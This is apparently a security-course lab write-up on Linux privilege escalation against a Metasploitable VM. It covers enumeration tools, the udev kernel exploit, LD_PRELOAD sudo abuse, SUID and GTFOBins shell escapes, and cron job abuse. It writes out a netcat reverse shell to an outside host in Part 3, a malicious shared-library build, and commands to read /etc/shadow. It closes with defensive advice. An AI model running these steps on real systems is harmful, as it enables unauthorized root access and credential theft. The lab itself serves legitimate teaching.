# Linux Privilege Escalation Lab 
## Privilege escalation - enumeration, kernel exploit, LD_PRELOAD, SUID and cron jobs

---

## Lab environment

### Target (Linux / Metasploitable)

On the target system:

```bash
msfadmin@metasploitable:~$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

msfadmin@metasploitable:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04
Release:        8.04
Codename:       hardy
```

### SSH compatibility tweak


```bash
sudo nano /etc/ssh/ssh_config
```

Add this line *at the end*:

```text
HostKeyAlgorithms +ssh-rsa
```

---

## Part 1 - Enumeration with LinEnum and Linux Exploit Suggester

### 1.1 Download and run LinEnum (attacker -> target)

On **Kali**, clone LinEnum:

```bash
git clone https://github.com/rebootuser/LinEnum.git
cd LinEnum
```

You can either run it remotely (using `ssh`), or copy it to the target.

**Copy LinEnum.sh to target:**

```bash
scp LinEnum.sh msfadmin@192.168.0.101:~
```

On **Metasploitable**:

```bash
ssh msfadmin@192.168.0.101
chmod +x LinEnum.sh

# Run with useful options:
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

Flags:

* `-s` - scans for common privesc misconfigurations.
* `-k keyword` - search for files containing the specified keyword.
* `-r report` - write a report to file
* `-e /tmp/` - write any local exploit suggestions to `/tmp`.
* `-t` - thorough tests.

This gives you:

* Kernel and OS info.
* SUID/SGID binaries.
* Interesting configs (sudoers, cron, PATH, writable dirs).
* Potential local exploits.

### 1.2 Use Linux Exploit Suggester 

On **Kali**, download the script:

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
```

Copy to target:

```bash
scp linux-exploit-suggester.sh msfadmin@192.168.0.101:~
```

On **Metasploitable**:

```bash
./linux-exploit-suggester.sh
```

It will match the kernel (`2.6.24`) against known local kernel exploits and suggest candidates.

---

## Part 2 - Finding a kernel exploit with searchsploit (udev example)

We ll use `searchsploit` on Kali to find a **local privilege escalation exploit** targeting a kernel version close to `2.6.24` / Ubuntu 8.x.

### 2.1 Search for relevant exploits

On **Kali**, from the LinEnum directory or anywhere:

```bash
searchsploit privilege | grep -i 'linux kernel'
```

Narrow down by kernel version and distro:

```bash
searchsploit privilege | grep -i 'linux kernel' | grep -i 2.6 | grep -i ubuntu
```

Example output:

```text
Linux Kernel (Debian 9/10 / Ubuntu 1 | linux_x86/local/42276.c
Linux Kernel 2.6 (Gentoo / Ubuntu 8. | linux/local/8572.c
Linux Kernel 2.6.32 (Ubuntu 10.04) - | linux/local/41770.txt
Linux Kernel 2.6.37 (RedHat / Ubuntu | linux/local/15704.c
Linux Kernel < 2.6.34 (Ubuntu 10.10  | linux/local/15944.c
Linux Kernel < 2.6.34 (Ubuntu 10.10  | linux_x86/local/15916.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10 | linux/local/14814.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.0 | linux/local/17787.c
```

The second line is especially relevant:

```text
Linux Kernel 2.6 (Gentoo / Ubuntu 8. | linux/local/8572.c
```

This is a **local root exploit** ( the `udev` exploit) for older 2.6 kernels and Ubuntu 8.

### 2.2 Copy the exploit source and transfer to target

Copy from exploitdb:

```bash
cp /usr/share/exploitdb/exploits/linux/local/8572.c .
```

Transfer to target:

```bash
scp 8572.c msfadmin@192.168.0.101:~
```

---

## Part 3 - Compiling and using the udev exploit


On **Metasploitable**:

### 3.1 Compile the exploit

```bash
ssh msfadmin@192.168.0.101

gcc 8572.c -o udev_exploit
```

Now you have a local binary `udev_exploit`.

### 3.2 Find the udev netlink PID

The exploit requires the PID associated with the `udev` netlink socket.

```bash
cat /proc/net/netlink
```

Example output:

```text
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
f7c47800 0   0      00000000 0        0        00000000 2
f7c16400 4   0      00000000 0        0        00000000 2
f7f50800 7   0      00000000 0        0        00000000 2
f7cac600 9   0      00000000 0        0        00000000 2
f7c4f400 10  0      00000000 0        0        00000000 2
f7c47c00 15  0      00000000 0        0        00000000 2
df8ffa00 15  2265   00000001 0        0        00000000 2
f7c4b800 16  0      00000000 0        0        00000000 2
df9c1000 18  0      00000000 0        0        00000000 2
```

We are interested in the row where a non zero PID is associated with a netlink group used by udev. Here: `Pid = 2265`.

Confirm with `ps`:

```bash
ps -ef | grep udev
```

Example:

```text
root      2266     1  0 03:12 ?        00:00:00 /sbin/udevd --daemon
msfadmin  4632  4585  0 03:58 pts/1    00:00:00 grep udev
```

Some exploits use the PID from `/proc/net/netlink` minus one, like `2265` and `2266` in this case.
### 3.3 Prepare a root payload (reverse shell script)

We want the exploit to trigger a script as `root`.

Create a script in `/tmp`:

```bash
echo "#!/bin/bash" > /tmp/run
echo "nc 192.168.0.1 12345 -e /bin/bash" >> /tmp/run
chmod +x /tmp/run
```

This script will open a **reverse shell** from the target back to the Kali `192.168.0.1` on port `12345`.

### 3.4 Start a listener on Kali

On **Kali**:

```bash
nc -lvnp 12345
```

* `-l` - listen
* `-v` - verbose
* `-n` - numeric IPs
* `-p 12345` - listen on port 12345

### 3.5 Run the exploit

On **Metasploitable**:

```bash
./udev_exploit 2265
```

If successful:

* The udev service (running as root) executes `/tmp/run`.
* `/tmp/run` runs `nc ... -e /bin/bash`.
* Then Kali netcat listener receives a connection.

On **Kali**, `nc` should show:

```text
Connection from ... some ip
```

We can check with `whoami` command to see that we have become root.

You now have a **root shell** through a local kernel exploit.

---

## Part 4 - Privilege escalation via sudo and LD_PRELOAD

Another common privesc path: **misconfigured sudoers** allowing you to preserve `LD_PRELOAD`, which lets you inject a custom shared library that runs code before the target program.

### 4.1 Check sudo configuration

On the Linux host where this is configured, run:

```bash
sudo visudo
```

You see something like:

```text
Defaults:kali env_keep += "LD_PRELOAD"
kali   ALL=(ALL:ALL) ALL
```

This means:

* For user `kali`, `sudo` keeps the `LD_PRELOAD` environment variable.
* `kali` can run **any command** as root via `sudo`.

If we can supply `LD_PRELOAD` when running a setuid-root program via `sudo`, we can execute arbitrary code as root.

### 4.2 Create a malicious shared library (`shell.so`)

Write a small C file that runs `/bin/bash` when loaded. For example somethinf like:

* `shell.c` uses uses `system("/bin/bash");`

Compile:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

* `-fPIC` - position independent code.
* `-shared` - build a shared object.
* `-nostartfiles` - build without the standard startup files.

Now `shell.so` will be executed whenever it is preloaded into a process.

### 4.3 Abusing sudo with LD_PRELOAD

If `sudo -l` shows you can run a harmless command with root (e.g. `find`, `less`, etc.), you can leverage `LD_PRELOAD`:

For example:

```bash
sudo LD_PRELOAD=/home/user/kali/classesHE/privesc/shell.so find .
```

Because:

* `sudo` keeps your `LD_PRELOAD` (due to `env_keep`).
* `find` is executed as root with `LD_PRELOAD` set.
* The constructor in `shell.so` runs as **root**, spawning a root shell.

If sudoers restricts you to a specific command like `less`, you can do:

```bash
sudo LD_PRELOAD=./shell.so less test
```

As soon as `less` starts (as root), `LD_PRELOAD` loads `shell.so` and spawns a root shell.

---

## Part 5 - SUID binaries and GTFOBins (example `less`)

### 5.1 Enumerate SUID binaries

On the target, enumerate SUID (setuid) binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Additionally:

```bash
find . -perm -u=s
```

Look for unusual or custom SUID binaries (like a copy of `less` or `bash` owned by root and SUID-set).

Example:

* `./less` is owned by root and has SUID bit set.

### 5.2 Using less as root (if SUID-enabled)

If `less` is SUID-root, then:

```bash
./less /etc/shadow
```

may allow you to read `/etc/shadow` (since the process runs with roots UID), even if:

```bash
less /etc/shadow
```

as a normal binary would be blocked.

Or, referencing **GTFOBins** (`https://gtfobins.github.io/gtfobins/less/`):

* GTFOBins often show how to escape to a shell from within programs like `less`, `vi`, etc.
* E.g., use `! /bin/sh` from inside `less` to spawn a root shell (if the binary is SUID-root or run via sudo).

If `sudoers` lets you run `less` as root:

```bash
sudo less /etc/shadow
```

You can:

* Use the GTFOBins technique (like typing `:! /bin/bash` or `! /bin/sh` from within `less`), and you drop to a root shell.

This is why:

* "User can run `less` as root via sudo"
  often = "User can get a **root shell**," hence a privesc path.

---

## Part 6 - Misconfigured cron jobs

Another classic privesc is **cron jobs** running as root but calling scripts or binaries in unsafe ways.

Common patterns:

1. **Scripts deleted but cron line left behind**

   * You can recreate the script with your own contents in that path.

2. **Scripts that call other executables without an absolute path**

   * Something like `/usr/local/bin/backup.sh` contains `tar -czf /root/backup.tgz /root`
   * If cron runs this as root and your user can **write** to a directory earlier in `PATH` (like `/tmp`), you could drop your own `tar` in `/tmp/tar`, which is then executed as root.

3. **World-writable scripts** run by cron as root

   * `cron` executes the script, if you can edit it, you can add your own commands (reverse shell, add user and many more).

### 6.1 Finding cron jobs

On the target:

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

Look for:

* Scripts run as root.
* Writable scripts or directories.
* Scripts calling commands without full paths.

Any of these can be turned into a **delayed root shell**: you modify the script/path, wait for cron to run.

---

## Summary / Analysis

1. **Automated enumeration** (LinEnum, Linux Exploit Suggester)

   * Get a map of kernel version, SUID binaries, sudo rules, cron jobs and so on.

2. **Kernel exploit (udev)**

   * Using `searchsploit` and exploit-db to find a matching local root exploit for Ubuntu 8.04 / 2.6.24.
   * Compiling and running it to spawn a root reverse shell.

3. **Sudo + LD_PRELOAD misconfig**

   * Showing how a single `env_keep += "LD_PRELOAD"` line can allow a normal user to execute arbitrary code as root via shared library injection.

4. **SUID binaries & GTFOBins**

   * Enumerating SUID programs and using documented escape sequences (like for `less`) to break out into a root shell or read protected files like `/etc/shadow`.

5. **Misconfigured cron jobs**

   * How writable scripts or unsafe PATH usage in root cron tasks can be turned into scheduled root code execution.

From a **defensive** side of things:

* Keep kernels and OS patched (to kill easy local exploits).
* Lock down sudoers (no unnecessary `env_keep`, minimal allowed commands).
* Avoid SUID on anything that doesnt absolutely need it.
* Regularly audit cron jobs and file permissions.
* Use tools like LinPEAS/LinEnum yourself as a defender to see what an attacker would see.
